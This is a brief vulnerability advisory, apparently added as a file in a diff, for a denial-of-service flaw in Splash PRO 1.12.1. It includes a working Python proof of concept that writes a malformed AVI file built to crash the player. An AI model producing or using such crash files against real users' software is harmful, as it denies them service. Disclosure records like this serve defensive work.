@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/52273/info
+
+Splash PRO is prone to a denial-of-service vulnerability.
+
+Attackers can exploit this issue to crash the affected application, denying service to legitimate users.
+
+Splash PRO 1.12.1 is vulnerable; other versions may also be affected. 
+
+PoC = "\x52\x49\x46\x46\x3c\xad\x08\x00\x41\x56\x49\x20\x4c\x49\x53\x54"
+PoC +=  "\x72\x22\x00\x00\x68\x64\x72\x6c"
+payload = (PoC)
+f = open("Crash.avi","wb")
+f.write(payload)
+f.close()
